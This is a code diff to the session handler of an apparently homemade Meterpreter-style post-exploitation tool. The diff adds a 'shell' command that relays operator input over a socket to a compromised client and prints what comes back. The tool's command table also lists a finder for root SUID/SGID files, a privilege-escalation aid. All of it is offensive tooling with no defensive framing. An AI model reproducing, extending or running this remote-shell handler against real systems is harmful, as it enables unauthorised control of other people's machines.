@@ -1,5 +1,6 @@
 import extra_functions.color as color
 import extra_functions.custom_print as custom_print
+import os
 
 
 class Session:
@@ -18,6 +19,7 @@ class Session:
             Session.__instance = self
             self.sessions = {}
             self.current_id = 1
+            self.current_session = None
             self.completer = None
             self.meterpreter_functions = {
             "help": {
@@ -39,6 +41,11 @@ class Session:
                 "function": "check_result",
                 "help": "Find root SUID_SGID files",
                 "execute":"suid_sgid <path>", 
+                "exec": True},
+            "shell": {
+                "function": "shell",
+                "help": "Spawn a Shell",
+                "execute":"shell", 
                 "exec": True}
         }
     
@@ -57,6 +64,7 @@ class Session:
         try:
             session_id = int(session_id)
             client = self.sessions[session_id]
+            self.current_session = client
         except:
             print("Session no found")
             return
@@ -83,7 +91,6 @@ class Session:
                     getattr(self, opt["function"])()
                     continue
                 client.send(data_input.encode())
-                
                 data = client.recv(4096)
                 if data:
                     if "Error" in data.decode():
@@ -94,12 +101,29 @@ class Session:
                 print(str(e))
                 if "Broken pipe" in str(e):
                     custom_print.info("Meterpreter closed")
-                    self.completer.restore_backup()
                     self._delete_session(session_id)
                     return 0
 
     def check_result(self, result):
         print(result)
+    
+    def help(self):
+        for k,v in self.meterpreter_functions.items():
+            self.print_info(k + ": " + v["help"])
+            print("   |_ Execute: " + v["execute"])
+    
+    def shell(self, result):
+        if "No" == result:
+            custom_print.info("No shell obtained")
+            return
+        print(result.strip(), end=" ")
+        while True:
+            data_input = input()
+            self.current_session.send((data_input+"\n").encode())
+            if "exit" in data_input:
+                return
+            recv = self.current_session.recv(1024)
+            print(recv.decode().strip(), end=" ")
     
     def _delete_session(self, id):
         try:
